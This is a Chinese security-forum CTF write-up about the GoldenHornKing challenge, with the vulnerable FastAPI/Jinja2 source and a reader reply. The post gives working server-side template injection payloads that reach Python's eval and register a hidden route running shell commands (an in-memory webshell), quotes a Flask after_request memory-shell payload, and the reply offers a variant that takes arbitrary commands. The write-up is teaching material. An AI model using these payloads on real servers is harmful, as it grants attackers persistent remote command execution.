@@ -1,0 +1,864 @@
+<head>
+    <meta charset="utf-8">
+    <title>从一道题学习FastAPI伪内存马 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="/static/icon/favicon.ico" type="image/x-icon">
+    <link href="/static/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="/static/editor.md/css/editormd.min.css">
+    <link rel="stylesheet" href="/static/css/bbs/tango.css">
+    <link href="/static/css/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="/static/css/OverlayStyle.css">
+    <link rel="stylesheet" href="/static/css/topic.css">
+    <link rel="stylesheet" href="/static/css/beautify.css">
+    
+    <link rel="stylesheet" href="/static/editor.md/css/editormd.css">
+    <link rel="stylesheet" href="/static/css/bbs/tango.css">
+    <link rel="stylesheet" href="/static/plugins/fancybox/jquery.fancybox.min.css">
+
+    <script src="https://g.alicdn.com/AWSC/et/1.82.2/et_f.js" id="AWSC_etModule"></script><script src="//aeu.alicdn.com/waf/jquery_221121.min.js"></script><script src="//aeu.alicdn.com/waf/antidomxss_v702.js"></script><script src="//aeu.alicdn.com/waf/interfaceacting230515.js"></script><!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="/static/js/jquery-2.1.3.min.js"></script>
+    
+    
+    <script src="/static/plugins/fancybox/jquery.fancybox.min.js"></script>
+
+    <!-- <![endif]-->
+<style type="text/css">#waf_nc_block{position:fixed;_position:absolute;width:100%;height:100%;top:0;bottom:0;left:0;z-index:99999}.waf-nc-mask{background:#000;opacity:.5;filter:alpha(opacity=50);width:100%;height:100%}.waf-nc-wrapper{width:348px;height:236px;text-align:center;position:absolute;top:50%;left:50%;margin-top:-160px;margin-left:-200px;margin-bottom:16px;background:#fff;box-shadow:0 0 10px 0 rgba(0,0,0,0.15)}.waf-nc-title{margin-top:28px;font-size:24px;font-weight:500;color:#181818;letter-spacing:1.71px;text-align:center}.waf-nc-description{margin-top:24px;margin-left:24px;font-size:14px;color:#666;text-align:left}.waf-nc-traceid-class{margin-top:8px;margin-left:24px;font-size:12px;color:#999;text-align:left}#nocaptcha{margin-left:24px;margin-top:14px}.nc_bg{background:#fff3ea!important}.btn_slide{background:#ff6a00!important;border:0!important;color:#fff!important;width:48px!important;height:48px!important;font-size:30px;font-weight:900!important;line-height:48px!important}.btn_ok{background:#ff6a00!important;border:0!important;color:#fff!important;width:48px!important;height:48px!important;font-size:30px;font-weight:900!important;line-height:48px!important}.nc_scale{background:rgba(241,241,242,1)!important;height:48px!important}.nc-lang-cnt{height:48px!important;margin-left:10px!important;line-height:48px!important;font-size:14px!important}</style><script src="//g.alicdn.com/AWSC/AWSC/awsc.js?t=2081"></script><style type="text/css">.new-prompt[data-v-be061d42]{position:fixed;z-index:99999;background:rgba(0,0,0,.6);top:0;left:0;right:0;bottom:0;cursor:auto}.new-prompt dialog[data-v-be061d42]{width:380px;position:absolute;left:50%;transform:translate(-50%,-50%);top:50%;border:none;border-radius:5px;padding:10px 20px;margin:0}.new-prompt p[data-v-be061d42]{margin:20px 0 5px}.new-prompt input[data-v-be061d42]{height:25px}.new-prompt input[data-v-be061d42],.new-prompt textarea[data-v-be061d42]{width:100%;border:1px solid #d9d9d9;border-radius:5px}.new-prompt dialog svg[data-v-be061d42]{float:right;cursor:pointer}.new-prompt button[data-v-be061d42]{border-radius:5px;width:60px;height:28px;margin:20px 10px;cursor:pointer}.cancel-btn[data-v-be061d42]{background:#fff;border:1px solid #d9d9d9}.sure-btn[data-v-be061d42]{border:none;background:#7f85ef;color:#fff}.btn-div[data-v-be061d42]{text-align:right}.pro-title[data-v-be061d42]{font-size:16px;font-weight:600;text-align:center}.input-text[data-v-be061d42]{padding:0 0 0 5px}.textarea-text[data-v-be061d42]{padding:5px 0 0 5px}</style><style type="text/css">.message-box[data-v-3436135a]{position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:99999;width:80%;padding:10px 20px;border-radius:4px;background-color:#f0f0f0;box-shadow:0 2px 4px rgba(0,0,0,.2)}.message-text[data-v-3436135a]{margin-right:8px}.message-info[data-v-3436135a]{color:#35495e}.message-success[data-v-3436135a]{color:#67c23a;background-color:#f2f9ec}.message-warning[data-v-3436135a]{color:#e6a23c}.message-error[data-v-3436135a]{color:#f56c6c}.el-icon-close[data-v-3436135a]{cursor:pointer;margin-left:8px}</style><style type="text/css">.upgradeButton[data-v-3009edd8]{border:none;position:absolute;color:#fff;right:7px;background:#3872e0;padding:2px 10px;border-radius:10px;cursor:pointer}.continue[data-v-3009edd8]{margin-left:5px;border-color:#7f89e1;border-width:1px;border-style:solid;color:#7f89e1;border-radius:13px;text-align:center;font-weight:400;font-style:normal;background:#fff;line-height:normal;padding:2px 11px;font-size:12px;cursor:pointer}</style><style>#chat_sider .popver[refresh]::after {
+      content: "刷新";
+  }#chat_sider .popver[copy]::after {
+      content: "复制";
+  }#chat_sider .popver[expandSidebar]::after {
+      content: "展开侧边栏";
+  }</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F15328&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="/static/plugins/toc/jquery.toc.min.js"></script>
+    <script src="/static/plugins/toc/toc.min.js"></script>
+    <script src="/static/js/dt.js"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">从一道题学习FastAPI伪内存马</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="/u/82355">
+                        <span class="username cell"> ooyywwll</span></a> <span class="i-seprator"> / </span>
+                    <span> 2024-08-17 20:47:54</span><span class="i-seprator"> / </span>
+                    
+                        <span>发表于四川 / </span>
+                    
+                    <span>浏览数 616</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="/tab/4">社区板块</a></span>
+                        <span class="label label-default">
+                            <a href="/node/13">CTF</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(15328);">
+             顶(0)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(15328);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <p>主要是根据巅峰极客2024GoldenHornKing</p>
+<p>首先进入题目给出了源码</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">jinja2</span>
+<span class="kn">import</span> <span class="nn">functools</span>
+<span class="kn">import</span> <span class="nn">uvicorn</span>
+<span class="n">from</span> <span class="n">fastapi</span> <span class="kn">import</span> <span class="nn">FastAPI</span>
+<span class="n">from</span> <span class="n">fastapi</span><span class="o">.</span><span class="na">templating</span> <span class="kn">import</span> <span class="nn">Jinja2Templates</span>
+<span class="n">from</span> <span class="n">anyio</span> <span class="kn">import</span> <span class="nn">fail_after</span>
+
+<span class="err">#</span> <span class="n">jinja2</span><span class="o">==</span><span class="mf">3.1.2</span>
+<span class="err">#</span> <span class="n">uvicorn</span><span class="o">==</span><span class="mf">0.30.5</span>
+<span class="err">#</span> <span class="n">fastapi</span><span class="o">==</span><span class="mf">0.112.0</span>
+
+<span class="n">def</span> <span class="nf">timeout_after</span><span class="o">(</span><span class="n">timeout</span><span class="o">:</span> <span class="kt">int</span> <span class="o">=</span> <span class="mi">1</span><span class="o">):</span>
+    <span class="n">def</span> <span class="nf">decorator</span><span class="o">(</span><span class="n">func</span><span class="o">):</span>
+        <span class="nd">@functools.wraps</span><span class="o">(</span><span class="n">func</span><span class="o">)</span>
+        <span class="n">async</span> <span class="n">def</span> <span class="nf">wrapper</span><span class="o">(*</span><span class="n">args</span><span class="o">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="o">):</span>
+            <span class="n">with</span> <span class="nf">fail_after</span><span class="o">(</span><span class="n">timeout</span><span class="o">):</span>
+                <span class="k">return</span> <span class="n">await</span> <span class="nf">func</span><span class="o">(*</span><span class="n">args</span><span class="o">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="o">)</span>
+        <span class="k">return</span> <span class="n">wrapper</span>
+    <span class="k">return</span> <span class="n">decorator</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="o">()</span>
+<span class="n">access</span> <span class="o">=</span> <span class="n">False</span>
+
+<span class="n">_base_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="na">path</span><span class="o">.</span><span class="na">dirname</span><span class="o">(</span><span class="n">os</span><span class="o">.</span><span class="na">path</span><span class="o">.</span><span class="na">abspath</span><span class="o">(</span><span class="n">__file__</span><span class="o">))</span>
+<span class="n">t</span> <span class="o">=</span> <span class="n">Jinja2Templates</span><span class="o">(</span><span class="n">directory</span><span class="o">=</span><span class="n">_base_path</span><span class="o">)</span>
+
+<span class="nd">@app.get</span><span class="o">(</span><span class="s">"/"</span><span class="o">)</span>
+<span class="nd">@timeout_after</span><span class="o">(</span><span class="mi">1</span><span class="o">)</span>
+<span class="n">async</span> <span class="n">def</span> <span class="nf">index</span><span class="o">():</span>
+    <span class="k">return</span> <span class="n">open</span><span class="o">(</span><span class="n">__file__</span><span class="o">,</span> <span class="sc">'r'</span><span class="o">).</span><span class="na">read</span><span class="o">()</span>
+
+<span class="nd">@app.get</span><span class="o">(</span><span class="s">"/calc"</span><span class="o">)</span>
+<span class="nd">@timeout_after</span><span class="o">(</span><span class="mi">1</span><span class="o">)</span>
+<span class="n">async</span> <span class="n">def</span> <span class="nf">ssti</span><span class="o">(</span><span class="n">calc_req</span><span class="o">:</span> <span class="n">str</span><span class="o">):</span>
+    <span class="n">global</span> <span class="n">access</span>
+    <span class="nf">if</span> <span class="o">(</span><span class="n">any</span><span class="o">(</span><span class="kt">char</span><span class="o">.</span><span class="na">isdigit</span><span class="o">()</span> <span class="k">for</span> <span class="kt">char</span> <span class="n">in</span> <span class="n">calc_req</span><span class="o">))</span> <span class="n">or</span> <span class="o">(</span><span class="s">"%"</span> <span class="n">in</span> <span class="n">calc_req</span><span class="o">)</span> <span class="n">or</span> <span class="n">not</span> <span class="n">calc_req</span><span class="o">.</span><span class="na">isascii</span><span class="o">()</span> <span class="n">or</span> <span class="n">access</span><span class="o">:</span>
+        <span class="k">return</span> <span class="s">"bad char"</span>
+    <span class="k">else</span><span class="o">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">jinja2</span><span class="o">.</span><span class="na">Environment</span><span class="o">(</span><span class="n">loader</span><span class="o">=</span><span class="n">jinja2</span><span class="o">.</span><span class="na">BaseLoader</span><span class="o">()).</span><span class="na">from_string</span><span class="o">(</span><span class="n">f</span><span class="s">"{{{{ {calc_req} }}}}"</span><span class="o">).</span><span class="na">render</span><span class="o">(</span>
+            <span class="o">{</span><span class="s">"app"</span><span class="o">:</span> <span class="n">app</span><span class="o">})</span>
+        <span class="n">access</span> <span class="o">=</span> <span class="n">True</span>
+        <span class="k">return</span> <span class="n">result</span>  <span class="err">#</span> <span class="n">返回计算结果</span>
+    <span class="k">return</span> <span class="s">"fight"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="o">:</span>
+    <span class="n">uvicorn</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">app</span><span class="o">,</span> <span class="n">host</span><span class="o">=</span><span class="s">"127.0.0.1"</span><span class="o">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="o">)</span>
+</pre></div>
+<p>我们可以看到是一个基于FastAPI 的简单 Web 应用</p>
+<p>一共两个路由，根目录就是返回我们的源码</p>
+<p><strong><code>/calc</code> 路由</strong> (<code>ssti</code> 函数)：接收一个字符串参数 <code>calc_req</code>，然后会有一个waf吧，首先不能有数字，然后%也被禁用了，弹shell是不需要思考了的</p>
+<p>然后将其作为模板字符串通过 Jinja2 进行渲染</p>
+<p>但是没有返回我们的渲染结果，而且渲染完成后还要把我们的access设置为True，意为着</p>
+<p>后续的 <code>/calc</code> 请求将被拒绝，返回 <code>"bad char"</code></p>
+<p>那相当于我们只有一次机会，其实种种特征都是在暗示我们打python的内存马</p>
+<p>以前是学过flask的内存马的，基本的构造逻辑还是知道的，添加路由，构造处理方法，解决传参问题，构造回显</p>
+<p>其实仿照我们的flask内存马思路，我们寻找可以添加路由的函数</p>
+<p><a id="img0" href="https://xzfile.aliyuncs.com/media/upload/picture/20240817204714-d40c4320-5c96-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817204714-d40c4320-5c96-1.png"></a></p>
+<p><a id="img1" href="https://xzfile.aliyuncs.com/media/upload/picture/20240817204718-d6531c3a-5c96-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817204718-d6531c3a-5c96-1.png"></a></p>
+<p>可以发现还是挺多的，我们仔细看看</p>
+<p><strong>add_route</strong></p>
+<div class="highlight"><pre><span></span><span class="x">def add_route(</span>
+<span class="x">    self,</span>
+<span class="x">    path: str,</span>
+<span class="x">    route: typing.Callable[[Request], typing.Awaitable[Response] | Response],</span>
+<span class="x">    methods: list[str] | None = None,</span>
+<span class="x">    name: str | None = None,</span>
+<span class="x">    include_in_schema: bool = True,</span>
+<span class="x">)</span>
+</pre></div>
+<p>path都明白，然后处理方法应该就是我们的</p>
+<p>route，但是有个问题，就是这个route还需要Request和Response，我是翻了半天没有翻到的</p>
+<p>然后就是我们的<strong>add_api_route</strong></p>
+<div class="highlight"><pre><span></span><span class="x">def add_api_route(</span>
+<span class="x">        self,</span>
+<span class="x">        path: str,</span>
+<span class="x">        endpoint: Callable[..., Coroutine[Any, Any, Response]],</span>
+<span class="x">        *,</span>
+<span class="x">        response_model: Any = Default(None),</span>
+<span class="x">        status_code: Optional[int] = None,</span>
+<span class="x">        tags: Optional[List[Union[str, Enum]]] = None,</span>
+<span class="x">        dependencies: Optional[Sequence[Depends]] = None,</span>
+<span class="x">        summary: Optional[str] = None,</span>
+<span class="x">        description: Optional[str] = None,</span>
+<span class="x">        response_description: str = "Successful Response",</span>
+<span class="x">        responses: Optional[Dict[Union[int, str], Dict[str, Any]]] = None,</span>
+<span class="x">        deprecated: Optional[bool] = None,</span>
+<span class="x">        methods: Optional[List[str]] = None,</span>
+<span class="x">        operation_id: Optional[str] = None,</span>
+<span class="x">        response_model_include: Optional[IncEx] = None,</span>
+<span class="x">        response_model_exclude: Optional[IncEx] = None,</span>
+<span class="x">        response_model_by_alias: bool = True,</span>
+<span class="x">        response_model_exclude_unset: bool = False,</span>
+<span class="x">        response_model_exclude_defaults: bool = False,</span>
+<span class="x">        response_model_exclude_none: bool = False,</span>
+<span class="x">        include_in_schema: bool = True,</span>
+<span class="x">        response_class: Union[Type[Response], DefaultPlaceholder] = Default(</span>
+<span class="x">            JSONResponse</span>
+<span class="x">        ),</span>
+<span class="x">        name: Optional[str] = None,</span>
+<span class="x">        openapi_extra: Optional[Dict[str, Any]] = None,</span>
+<span class="x">        generate_unique_id_function: Callable[[routing.APIRoute], str] = Default(</span>
+<span class="x">            generate_unique_id</span>
+<span class="x">        )</span>
+</pre></div>
+<p>重点的参数就是path和endpoint</p>
+<p><strong><code>Callable[..., Coroutine[Any, Any, Response]]</code></strong>：这个类型提示表示 <code>endpoint</code> 应该是一个可以被调用的对象，它返回一个协程对象，该协程最终会产生一个 <code>Response</code> 对象。</p>
+<p>那其实就是一个正常的函数逻辑，我们还是按照flask的内存马，设置一个匿名的函数</p>
+<p>现在的问题就是获取app了</p>
+<p>其实emm获取的方法太多了，首先获取global才是当务之急，我们知道这是一个jinja2，那就很多了比如我们的</p>
+<p><code>namespace.__init__.__globals__</code></p>
+<p><a id="img2" href="https://xzfile.aliyuncs.com/media/upload/picture/20240817204728-dc29e97c-5c96-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817204728-dc29e97c-5c96-1.png"></a></p>
+<p>然后获取app，就是先获取我们的main</p>
+<p>main是模块里面的，先获取moudle，然后moudle又可以从sys获取</p>
+<div class="highlight"><pre><span></span><span class="n">namespace</span><span class="o">.</span><span class="na">__init__</span><span class="o">.</span><span class="na">__globals__</span><span class="o">[</span><span class="err">'</span><span class="n">__builtins__</span><span class="err">'</span><span class="o">][</span><span class="err">'</span><span class="n">eval</span><span class="err">'</span><span class="o">](</span><span class="s">"__import__('sys').modules['__main__'].app"</span><span class="o">)</span>
+</pre></div>
+<p><a id="img3" href="https://xzfile.aliyuncs.com/media/upload/picture/20240817204733-df9a656e-5c96-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817204733-df9a656e-5c96-1.png"></a></p>
+<p>然后就是写添加路由的逻辑和代码了</p>
+<p>paylaod如下</p>
+<div class="highlight"><pre><span></span><span class="n">namespace</span><span class="o">.</span><span class="na">__init__</span><span class="o">.</span><span class="na">__globals__</span><span class="o">[</span><span class="err">'</span><span class="n">__builtins__</span><span class="err">'</span><span class="o">][</span><span class="err">'</span><span class="n">eval</span><span class="err">'</span><span class="o">](</span><span class="s">"__import__('sys').modules['__main__'].app.add_api_route(path='/lll',endpoint=lambda :__import__('os').popen('whoami').read())"</span><span class="o">)</span>
+</pre></div>
+<p><a id="img4" href="https://xzfile.aliyuncs.com/media/upload/picture/20240817204744-e6139eba-5c96-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817204744-e6139eba-5c96-1.png"></a></p>
+<p>可以看到成功</p>
+<p>但是有个缺点就是不能很自由的输入参数，然后我去挖掘了很久，没有什么收获</p>
+<p>我的思路是这样的，要么我去找到这个对应的request对象，然后控制参数，或者我能控制这个response对象，让他返回的内容是固定的</p>
+<p>类似于我看到过的一个paylaod</p>
+<div class="highlight"><pre><span></span><span class="o">(</span><span class="n">app</span><span class="o">.</span><span class="na">after_request_funcs</span><span class="o">.</span><span class="na">setdefault</span><span class="o">(</span><span class="n">None</span><span class="o">,</span> <span class="o">[]).</span><span class="na">append</span><span class="o">(</span><span class="n">lambda</span> <span class="n">resp</span><span class="o">:</span> <span class="n">CmdResp</span> <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="na">args</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="err">'</span><span class="n">cmd</span><span class="err">'</span><span class="o">)</span> <span class="n">and</span> <span class="nf">exec</span><span class="o">(</span><span class="err">'</span><span class="n">global</span> <span class="n">CmdResp</span><span class="o">;</span><span class="n">CmdResp</span><span class="o">=</span><span class="n">__import__</span><span class="o">(</span><span class="err">\'</span><span class="n">flask</span><span class="err">\'</span><span class="o">).</span><span class="na">make_response</span><span class="o">(</span><span class="n">os</span><span class="o">.</span><span class="na">popen</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">args</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="err">\'</span><span class="n">cmd</span><span class="err">\'</span><span class="o">)).</span><span class="na">read</span><span class="o">())</span><span class="err">'</span><span class="o">)==</span><span class="n">None</span> <span class="k">else</span> <span class="n">resp</span><span class="o">))</span>
+</pre></div>
+<p>然后我找了好久的request对象都没有找到，当然是找到了一些没有作用的</p>
+<p>后来想过</p>
+<p>("<strong>import</strong>('request')")</p>
+<p>直接引入，但是思考后觉得不可以，因为我的request是当前这个请求的request，不随便引入就能解决的，最后也没有办法</p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="15328">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">0</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="15328">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
+                    </span>
+                
+                
+                    <span class="btn btn-default pull-right">
+                     <span>
+                         
+                             <span id="ready_reward" data-toggle="modal" data-target="#myModal">打赏</span>
+                         
+                     </span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="/t/15326" title="从一道题学习jetbrick-template表达式注入"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>从一道题学习jetbrick-te...</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="/t/15329" title="jmreport权限绕过与Aviator注入分析"><span class="related-label" style="">下一篇：</span>jmreport权限绕过与Avia...</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+<div class="modal fade" id="myModal" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="myModalLabel" style="text-align: center">
+                    积分打赏
+                </h4>
+            </div>
+            <div class="modal-body" id="button-value">
+                <div style="text-align: center;">
+                 <div role="group">
+                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type1">
+                        1分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type2">
+                        2分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type3">
+                        5分
+                    </button>
+                 </div>
+                 <br>
+                 <div style="margin-top: 20px">
+                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type4">
+                        8分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type5">
+                        10分
+                    </button>
+                    <button type="button" class="btn btn-secondary m64" style="min-width: 64px;" data-value="type6">
+                        20分
+                    </button>
+                 </div>
+                </div>
+            </div>
+            <div class="modal-footer" id="confirm">
+                <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
+                <button type="button" class="btn btn-primary" id="reward_topic" data-pk="15328">确定</button>
+            </div>
+        </div>
+    </div><!-- /.modal -->
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">1 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-20367">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="/u/79502">xaitx</a>
+                                
+                                <span class="bbs-time">2024-08-26 14:06:43</span>
+                                
+                                    <span>来自北京 </span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>其实在构造函数时候就可以指定参数</p>
+<div class="highlight"><pre><span></span><span class="n">app</span><span class="o">.</span><span class="n">add_api_route</span><span class="p">(</span><span class="n">path</span><span class="o">=</span><span class="s1">'/xxx'</span><span class="p">,</span><span class="n">endpoint</span><span class="o">=</span><span class="k">lambda</span> <span class="n">cmd</span> <span class="p">:</span><span class="nb">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+<p>可以直接通过匿名函数的参数接收参数值</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="20367" data-topic="15328"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="xaitx">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F15328&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F15328&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice" style="padding: 6px 10px 6px 10px;">
+            <strong>最新公告：</strong>
+            <div class="info-body">
+                <a href="/t/16922" style="padding: 4px 10px 4px 10px;">
+                    期待硬核议题！2025阿里白帽大会议题征集启动！
+                </a>
+                <span style="float: right;">
+                    2024-12-26
+                </span>
+            </div>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice" style="padding: 6px 10px 6px 10px;">
+            <strong>月度热门：</strong>
+        </div>
+    <div class="info-body">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16512" title="IoT 安全从零到掌握：超详尽入门指南（基础篇）">
+                                IoT 安全从零到掌握：超详尽入门指南（基础篇）
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16511" title="IoT 安全从零到掌握：超详尽入门指南（实战篇）">
+                                IoT 安全从零到掌握：超详尽入门指南（实战篇）
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/55138_37955972e3119d3041.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16486" title="动态逃逸杀软的艺术">
+                                动态逃逸杀软的艺术
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16652" title="分享一次 C++ PWN 出题经历——深入研究异常处理机制">
+                                分享一次 C++ PWN 出题经历——深入研究异常处理机制
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16687" title="某系统渗透测试">
+                                某系统渗透测试
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16630" title="代码审计 - MCMS v5.4.1 0day挖掘">
+                                代码审计 - MCMS v5.4.1 0day挖掘
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16668" title="基于armv7l架构的进程注入研究——使用ptrace注入shellcode">
+                                基于armv7l架构的进程注入研究——使用ptrace注入shellcode
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16562" title="深入异构 PWN：PowerPC&amp;ARM&amp;MIPS">
+                                深入异构 PWN：PowerPC&amp;ARM&amp;MIPS
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="/t/16581" title="S8强网杯Final-thinkshopplus">
+                                S8强网杯Final-thinkshopplus
+                            </a>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
